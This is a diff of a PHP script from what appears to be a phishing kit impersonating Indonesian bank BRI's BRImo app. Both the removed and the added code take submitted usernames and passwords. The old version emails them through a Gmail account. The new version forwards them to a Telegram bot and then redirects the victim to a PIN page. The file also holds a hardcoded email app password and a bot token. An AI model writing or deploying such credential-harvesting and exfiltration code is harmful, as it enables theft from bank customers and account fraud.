@@ -1,53 +1,34 @@
 <?php
-header('location: pin.php');
-?>
-<?php
+/* -----------------------------------------------------
+Simple PHP script for Sending Telegram Bot Message
+~ Iky | https://www.wadagizig.com
+------------------------------------------------------ */
 
-use PHPMailer\PHPMailer\PHPMailer;
-use PHPMailer\PHPMailer\Exception;
+function sendMessage($telegram_id, $message_text, $message_text1, $secret_token) {
 
-require_once "library/PHPMailer.php";
-require_once "library/Exception.php";
-require_once "library/OAuth.php";
-require_once "library/POP3.php";
-require_once "library/SMTP.php";
- 
-    $mail = new PHPMailer;
- 
-    //Enable SMTP debugging. 
-    $mail->SMTPDebug = 3;                               
-    //Set PHPMailer to use SMTP.
-    $mail->isSMTP();            
-    //Set SMTP host name                          
-    $mail->Host = "tls://smtp.gmail.com"; //host mail server
-    //Set this to true if SMTP host requires authentication to send email
-    $mail->SMTPAuth = true;                          
-    //Provide username and password     
-    $mail->Username = "gerebegboy@gmail.com";   //nama-email smtp          
-    $mail->Password = "wfbhkrlrofhiirre";           //password email smtp
-    //If SMTP requires TLS encryption then set it
-    $mail->SMTPSecure = "tls";                           
-    //Set TCP port to connect to 
-    $mail->Port = 587;                                   
- 
-    $mail->From = "gerebegboy@gmail.com"; //email pengirim
-    $mail->FromName = "Bank BRI Data"; //nama pengirim
- 
-     $mail->addAddress($_POST['email'], $_POST['nama']); //email penerima
- 
-    $mail->isHTML(true);
- 
-    $mail->Subject = $_POST['subjek']; //subject
-    $mail->Body    = "Username: ".$_POST['pesan']." Password: ".$_POST['pesan1']; //isi email
-        $mail->AltBody = "PHP mailer"; //body email (optional)
- 
-    if(!$mail->send()) 
-    {
-        echo "Mailer Error: " . $mail->ErrorInfo;
-    } 
-    else 
-    {
-        echo "Message has been sent successfully";
-    }
+    $url = "https://api.telegram.org/bot" . $secret_token . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
+    $url = $url . "&text=" . urlencode($message_text);
+    $ch = curl_init();
+    $optArray = array(
+            CURLOPT_URL => $url,
+            CURLOPT_RETURNTRANSFER => true
+    );
+    curl_setopt_array($ch, $optArray);
+    $result = curl_exec($ch);
+    curl_close($ch);
+}
 
+/*----------------------
+only basic POST method :
+-----------------------*/
+$telegram_id = $_POST ['telegram_id'];
+$message_text ="Akun login aplikasi Brimo Adalah >> "."Username: ".$_POST ['message_text1']." Password: ".$_POST ['message_text'];
+
+/*--------------------------------
+Isi TOKEN dibawah ini: 
+--------------------------------*/
+$secret_token = "5655115185:AAHCJhOWjnjMdnZYhaAoxpE7eh7HtdnqMsc";
+sendMessage($telegram_id, $message_text, $message_text1, $secret_token);
+
+echo "<script>alert('Pesan berhasil terkirim!'); window.location.href = 'pin.php';</script>";
 ?>
